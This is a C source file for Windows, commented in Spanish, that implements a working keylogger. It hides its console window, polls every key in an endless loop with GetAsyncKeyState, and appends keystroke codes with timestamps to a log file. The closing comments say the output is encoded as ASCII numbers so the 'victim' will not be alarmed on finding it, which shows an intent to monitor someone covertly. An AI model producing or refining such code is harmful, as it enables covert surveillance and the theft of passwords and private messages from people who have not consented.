//Librerias usadas
#include <stdio.h>
#include <windows.h>
#include <time.h>

// Nombre del archivo de salida
#define FILE_NAME "Record.log"

main(){
    //oculta la ventana de la consola
    FreeConsole();

    //abrir o crear un archivo
    FILE *file = fopen(FILE_NAME, "a");

    //escribir fecha y hora; & un '0' adicional antes de cada inicio que se utiliza durante la decodificaci�n
    time_t date = time(NULL);
    fprintf(file, "0\n%s\t", ctime(&date));
    fclose(file);

    unsigned short ch, i;
    while(1){ //Bucle infinito

        ch=1;
        while(ch<250){ //escanea de 0 a 249 caracteres ASCII

            //este bucle extrao y extra ayuda a detectar pulsaciones rpidas de teclas con
            //uso m�nimo del procesador
            for(i=0; i<50; i++, ch++){

                //cuando la tecla es un golpe
                if(GetAsyncKeyState(ch) == -32767){

                    //a�adir el c�digo ASCII del car�cter
                    file=fopen(FILE_NAME, "a");
                    fprintf(file, "%d ", ch);
                    fclose(file);
                }
            }

            //esta suspensi�n de 1 ms impide que el programa ocupe todo el procesador
            Sleep(1);
        }
    }

}
//Keylogger mas corto y mejor con Texto
//Codificado en ASCII para que la victima
//No se alarme por el archivo si esque
//lo llega a encontrar :D
